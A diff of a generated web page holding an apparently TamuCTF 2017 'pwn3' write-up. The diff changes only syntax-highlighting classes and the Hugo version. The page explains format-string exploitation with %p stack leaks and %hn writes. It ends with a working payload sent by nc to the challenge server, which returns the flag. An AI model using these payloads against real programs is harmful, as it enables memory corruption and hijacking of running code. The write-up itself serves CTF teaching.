@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="generator" content="Hugo 0.29-DEV" />
+    <meta name="generator" content="Hugo 0.30-DEV" />
 
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -241,14 +241,14 @@ We are being able to see the content of the stack remotely!</p>
 <code>%n</code> modifier writes <strong>the LENGTH of the string</strong> in the address provided by the user <strong>BEFORE</strong> the modifier itself.</p>
 
 <p>Lets see an example:</p>
-<div class="highlight"><pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="k">int</span><span class=""> </span><span class="n">c</span><span class="p">;</span><span class="">
-</span><span class=""></span><span class="n">printf</span><span class="p">(</span><span class="s"></span><span class="s">&#34;12345 %n blah</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class=""> </span><span class="o">&amp;</span><span class="n">c</span><span class="p">);</span><span class="">
-</span><span class=""></span><span class="o">//</span><span class=""> </span><span class="n">Here</span><span class=""> </span><span class="n">c</span><span class=""> </span><span class="n">will</span><span class=""> </span><span class="n">be</span><span class=""> </span><span class="m">6</span><span class=""> </span><span class="n">because</span><span class=""> </span><span class="s"></span><span class="s">&#34;12345 &#34;</span><span class=""> </span><span class="n">is</span><span class=""> </span><span class="m">6</span><span class=""> </span><span class="n">bytes</span><span class=""> </span><span class="n">length</span><span class="o">!</span></code></pre>
+<div class="highlight"><pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="kt">int</span><span class=""> </span><span class="n">c</span><span class="p">;</span><span class="">
+</span><span class=""></span><span class="n">printf</span><span class="p">(</span><span class="sa"></span><span class="s">&#34;12345 %n blah</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class=""> </span><span class="o">&amp;</span><span class="n">c</span><span class="p">);</span><span class="">
+</span><span class=""></span><span class="o">//</span><span class=""> </span><span class="n">Here</span><span class=""> </span><span class="n">c</span><span class=""> </span><span class="n">will</span><span class=""> </span><span class="n">be</span><span class=""> </span><span class="mi">6</span><span class=""> </span><span class="n">because</span><span class=""> </span><span class="sa"></span><span class="s">&#34;12345 &#34;</span><span class=""> </span><span class="n">is</span><span class=""> </span><span class="mi">6</span><span class=""> </span><span class="n">bytes</span><span class=""> </span><span class="n">length</span><span class="o">!</span></code></pre>
 </div>
 <p>So, lets try all of this out, the idea is to send a memory address, locate where is it into the stack and use the <code>%n</code> format parameter to save data in the memory address we provide.</p>
 
 <p>We will input 4 As (&ldquo;AAAA&rdquo;, which will be written in memory as <code>0x41414141</code> and will be easier to locate) and several <code>%p</code> to see the stack content and find out where the &ldquo;AAAA&rdquo; string is allocated inside of the stack.</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s">&#39;print(&#34;AAAA&#34; + &#34;%p %p %p %p %p &#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> ./pwn3</span><span class="p">;</span><span class=""> </span><span class="n">echo</span><span class="">
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;AAAA&#34; + &#34;%p %p %p %p %p &#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> ./pwn3</span><span class="p">;</span><span class=""> </span><span class="nb">echo</span><span class="">
 </span><span class="">Enter a word to be echoed:
 </span><span class="">AAAA0x2 </span><span class="o">(</span><span class="">nil</span><span class="o">)</span><span class=""> </span><span class="o">(</span><span class="">nil</span><span class="o">)</span><span class=""> 0x41414141 0x25207025</span></code></pre>
 </div>
@@ -259,7 +259,7 @@ We are being able to see the content of the stack remotely!</p>
 </blockquote>
 
 <p>Indeed, It does exist another way of printing that 4<sup>th</sup> value much more convenient for us: the index operator.</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s">&#39;print(&#34;AAAA&#34; + &#34;%4$p&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> ./pwn3</span><span class="p">;</span><span class=""> </span><span class="n">echo</span><span class="">
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;AAAA&#34; + &#34;%4$p&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> ./pwn3</span><span class="p">;</span><span class=""> </span><span class="nb">echo</span><span class="">
 </span><span class="">Enter a word to be echoed:
 </span><span class="">AAAA0x41414141</span></code></pre>
 </div>
@@ -331,15 +331,15 @@ $ python -c 'print(&quot;AAAA&quot; + &quot;%4$p&quot;)' | ./pwn3; echo
 </code><br /></li>
 
 <li><p>We have the address to write to (by the way, emember about the <a href="https://en.wikipedia.org/wiki/Endianness">endianess</a>).</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s">&#39;print(&#34;\x1c\xa0\x04\x08&#34; + &#34;%4$p&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> ./pwn3</span><span class="p">;</span><span class=""> echo</span></code></pre>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;\x1c\xa0\x04\x08&#34; + &#34;%4$p&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> ./pwn3</span><span class="p">;</span><span class=""> echo</span></code></pre>
 </div></li>
 
 <li><p>And here comes the last obstacle: We need to write the hex value <code>0x080485ab</code> through the <code>%n</code> operator.<br />
 We know <code>%n</code> can write the length of the string with preceeds itself into the provided address, so at a first glance we could think in writing <code>134,514,087</code> characters (<code>134,514,091 - 4</code> because we already wrote a 4-byte address):</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s">&#39;print(&#34;\x1c\xa0\x04\x08&#34; + &#34;A&#34;*134514087 + &#34;%4$n&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> ./pwn3</span><span class="p">;</span><span class=""> </span><span class="n">echo</span><span class="">
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;\x1c\xa0\x04\x08&#34; + &#34;A&#34;*134514087 + &#34;%4$n&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> ./pwn3</span><span class="p">;</span><span class=""> </span><span class="nb">echo</span><span class="">
 </span><span class="">Enter a word to be echoed:
 </span><span class="">Traceback </span><span class="o">(</span><span class="">most recent call last</span><span class="o">)</span><span class="">:
-</span><span class="">File </span><span class="s">&#34;&lt;string&gt;&#34;</span><span class="">, line </span><span class="m">1</span><span class="">, in &lt;module&gt;
+</span><span class="">File </span><span class="s2">&#34;&lt;string&gt;&#34;</span><span class="">, line </span><span class="m">1</span><span class="">, in &lt;module&gt;
 </span><span class="">IOError: </span><span class="o">[</span><span class="">Errno </span><span class="m">32</span><span class="o">]</span><span class=""> Broken pipe
 </span><span class="">Segmentation fault</span></code></pre>
 </div></li>
@@ -347,7 +347,7 @@ We know <code>%n</code> can write the length of the string with preceeds itself 
 
 <p>But aparently that is just to much for the pipe.<br />
 We could try the <code>%&lt;times&gt;x</code> parameter. It just print as many memory bytes as we tell it to, so we do not have to generate them with python.</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s">&#39;print(&#34;\x1c\xa0\x04\x08&#34; + &#34;%134514087x&#34; + &#34;%4$n&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> ./pwn3</span><span class="p">;</span><span class=""> echo</span></code></pre>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;\x1c\xa0\x04\x08&#34; + &#34;%134514087x&#34; + &#34;%4$n&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> ./pwn3</span><span class="p">;</span><span class=""> echo</span></code></pre>
 </div>
 <p>Meh! too much too.<br />
 But wait a moment, there is a special paramater <code>%h</code> which does the following:</p>
@@ -363,13 +363,13 @@ Let&rsquo;s represent this.</p>
 <p><img src="/assets/TamuCTF2017/pwn3/12-pwn3_scheme.png" alt="Pwn3 Scheme" /></p>
 
 <p>Then, it makes sense that the first value to be written should be the lowest one <code>0x804-8 = 2044</code> in the address <code>0x0804a01e</code> which will be stored in the <code>4th</code> position of the stack.</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s">&#39;print(&#34;\x1e\xa0\x04\x08&#34; + &#34;addr2&#34; + &#34;%2044x&#34; + &#34;%4$hn&#34; + &#34;%____x&#34; + &#34;%_$hn&#34;)&#39;</span></code></pre>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;\x1e\xa0\x04\x08&#34; + &#34;addr2&#34; + &#34;%2044x&#34; + &#34;%4$hn&#34; + &#34;%____x&#34; + &#34;%_$hn&#34;)&#39;</span></code></pre>
 </div>
 <p>The second value to be written is the biggest one <code>0x85ab - (2044 + 8) = 32167</code> in the address <code>0804a01c</code> which will be stored in the <code>5th</code> position of the stack.</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s">&#39;print(&#34;\x1e\xa0\x04\x08&#34; + &#34;\x1c\xa0\x04\x08&#34; + &#34;%2044x&#34; + &#34;%4$hn&#34; + &#34;%32167x&#34; + &#34;%5$hn&#34;)&#39;</span></code></pre>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;\x1e\xa0\x04\x08&#34; + &#34;\x1c\xa0\x04\x08&#34; + &#34;%2044x&#34; + &#34;%4$hn&#34; + &#34;%32167x&#34; + &#34;%5$hn&#34;)&#39;</span></code></pre>
 </div>
 <p>Finally! lets try it!</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s">&#39;print(&#34;\x1e\xa0\x04\x08&#34; + &#34;\x1c\xa0\x04\x08&#34; + &#34;%2044x&#34; + &#34;%4$hn&#34; + &#34;%32167x&#34; + &#34;%5$hn&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> nc pwn.ctf.tamu.edu </span><span class="m">4323</span><span class="">
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s1">&#39;print(&#34;\x1e\xa0\x04\x08&#34; + &#34;\x1c\xa0\x04\x08&#34; + &#34;%2044x&#34; + &#34;%4$hn&#34; + &#34;%32167x&#34; + &#34;%5$hn&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> nc pwn.ctf.tamu.edu </span><span class="m">4323</span><span class="">
 </span><span class="">                                                                                                                                                                                                                                      0This </span><span class="k">function</span><span class=""> has been deprecated
 </span><span class="">gigem</span><span class="o">{</span><span class="">F0RM@1NG_1S_H4RD</span><span class="o">}</span><span class="">
 </span><span class="">
@@ -392,7 +392,7 @@ Let&rsquo;s represent this.</p>
 </ul>
 
 <h4 id="some-notes-for-the-author">Some notes for the author</h4>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ r2 -R </span><span class="s">&#34;stdin=\&#34;`python -c &#39;print(\&#34;\x1e\xa0\x04\x08\x1c\xa0\x04\x08\&#34; + \&#34;%2044x%4</span><span class="n">$hn</span><span class="s">\&#34; + \&#34;%32167x%5</span><span class="n">$hn</span><span class="s">\&#34;)&#39;`\&#34;&#34;</span><span class=""> -d pwn3</span></code></pre>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ r2 -R </span><span class="s2">&#34;stdin=\&#34;`python -c &#39;print(\&#34;\x1e\xa0\x04\x08\x1c\xa0\x04\x08\&#34; + \&#34;%2044x%4</span><span class="nv">$hn</span><span class="s2">\&#34; + \&#34;%32167x%5</span><span class="nv">$hn</span><span class="s2">\&#34;)&#39;`\&#34;&#34;</span><span class=""> -d pwn3</span></code></pre>
 </div>
                     </div>
                     <div class="hmdl-page-comments mdl-color-text--primary-contrast mdl-card__supporting-text comments"> 
